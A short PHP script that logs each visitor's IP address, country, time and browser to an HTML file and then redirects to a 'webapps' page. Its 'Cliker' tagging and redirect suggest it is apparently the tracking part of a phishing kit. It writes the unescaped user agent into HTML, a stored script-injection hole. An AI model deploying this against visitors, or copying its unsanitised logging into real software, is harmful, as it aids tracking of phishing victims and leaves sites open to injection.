<?php
//Visitor IP address log//
include ('detect.php');
date_default_timezone_set('Europe/Sofia');
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_date = date("l d F H:i:s");
$agent = $_SERVER['HTTP_USER_AGENT'];
$msg = "
<font color='#CC397B'>Cliker ==> || IP : ".$ip." || Negara : ".$nama_negara." || ".$v_date." || Browser : ".$agent."<br></font>";

$file=fopen("data_ip_masuk.html","a");
fwrite($file, $msg);
header("location: webapps");
exit;

?>
